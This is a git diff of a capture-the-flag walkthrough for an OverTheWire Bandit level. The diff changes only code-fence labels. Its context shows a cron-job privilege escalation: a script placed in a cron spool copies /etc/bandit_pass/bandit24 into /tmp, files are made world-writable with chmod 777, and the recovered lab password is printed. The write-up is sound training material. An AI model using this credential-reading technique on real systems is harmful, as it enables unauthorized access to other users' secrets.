@@ -8,7 +8,7 @@ NOTE 2: Keep in mind that your shell script is removed once executed, so you may
 
 ## Solution
 
-```bash
+```console
 ssh bandit23@bandit.labs.overthewire.org -p 2220
 bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
 @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
@@ -39,7 +39,7 @@ bandit23@bandit:~$ nano myscript.sh
 
 I then needed to create a script as per the hint. Because I know the password exists at `/etc/bandit_pass/bandit24` and that cron has the permission to run the script, I can just have it printed to a file in the `/tmp/scripted/` directory:
 
-```bash
+```console
 #!/bin/bash
 
 cat /etc/bandit_pass/bandit24 >> /tmp/scripted/password.txt
@@ -47,7 +47,7 @@ cat /etc/bandit_pass/bandit24 >> /tmp/scripted/password.txt
 
 Then I just need to change the permissions on the file and place it within `/var/spool/bandit24/`:
 
-```bash
+```console
 bandit23@bandit:/tmp/scripted$ chmod 777 myscript.sh
 bandit23@bandit:/tmp/scripted$ cp myscript.sh /var/spool/bandit24/
 bandit23@bandit:/tmp/scripted$ ls -la
@@ -60,13 +60,13 @@ bandit23@bandit:/tmp/scripted$ chmod 777 ../scripted
 
 Then a case of watching the directory:
 
-```bash
+```console
 bandit23@bandit:/tmp/scripted$ watch ls -la
 ```
 
 Eventually a password will be presented to our directory:
 
-```bash
+```console
 bandit23@bandit:/tmp/scripted$ cat password.txt
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 ```
